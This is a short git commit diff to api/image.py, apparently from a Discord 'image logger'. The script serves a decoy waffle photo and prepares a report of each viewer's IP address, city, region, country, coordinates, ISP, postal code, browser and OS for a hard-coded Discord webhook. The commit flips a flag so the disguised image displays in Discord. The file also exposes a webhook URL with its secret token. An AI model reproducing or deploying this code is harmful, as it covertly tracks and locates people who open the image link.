f042a7f39ad0ea6c98a2f1a0322b1bee988e64f5
noxyggg <noxytact@gmail.com>
2025-09-16 00:44:41 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -5,7 +5,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1417368918837825657/KKyE0-ZyqqI7j_HoDIXeiWhJ3kuwRG09Ru0HUKlGvljAawIs13RyO4sR7Wg7ohNzB7Bj'
 
 bindata = httpx.get('https://www.designeatrepeat.com/wp-content/uploads/2024/11/chocolate-chip-waffles-featured.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
